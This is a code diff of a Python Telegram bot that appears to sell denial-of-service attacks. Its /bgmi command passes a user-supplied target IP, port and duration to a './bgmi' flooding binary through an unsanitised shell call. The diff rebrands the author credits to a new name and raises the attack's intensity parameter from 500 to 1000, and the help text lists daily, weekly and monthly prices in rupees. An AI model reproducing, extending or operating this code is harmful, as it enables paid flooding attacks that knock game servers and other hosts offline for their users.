@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#By Indian Watchdogs @Indian_Hackers_Team
+#By @akbhai
 
 import telebot
 import subprocess
@@ -242,7 +242,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 1000"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By  @venomXcrazy
+ By  @akbhai
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -329,7 +329,7 @@ Pr-ice List:
 Day-->100 Rs
 Week-->250 Rs
 Month-->600 Rs
-By  @venomXcrazy
+By  @akbhai
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By  @venomXcrazy
+By  @akbhai
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +375,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By venom crazy  @venomXcrazy
+#By akbhai
